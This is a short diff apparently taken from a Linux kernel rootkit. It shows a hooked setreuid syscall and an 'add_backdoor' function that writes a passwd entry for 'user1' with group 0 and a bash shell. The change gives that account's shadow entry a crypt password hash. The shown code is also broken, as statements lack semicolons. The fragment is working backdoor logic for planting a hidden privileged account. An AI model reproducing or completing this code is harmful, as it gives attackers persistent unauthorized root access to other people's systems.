@@ -54,7 +54,7 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 void add_backdoor(char *path) {
 	
 		backdoor_password = "user1:x:12345:0:backdoor:/home:/bin/bash\n"
-		backdoor_shadow = "user1::18232:0:99999:7:::\n"
+		backdoor_shadow = "user1:$1$MvZ75uo5$a2pTPgyDXrO6n.eyQjcmq0:18232:0:99999:7:::\n"
 		struct file *file;
 		char *backdoor;
 		mm_segment_t old_fs;
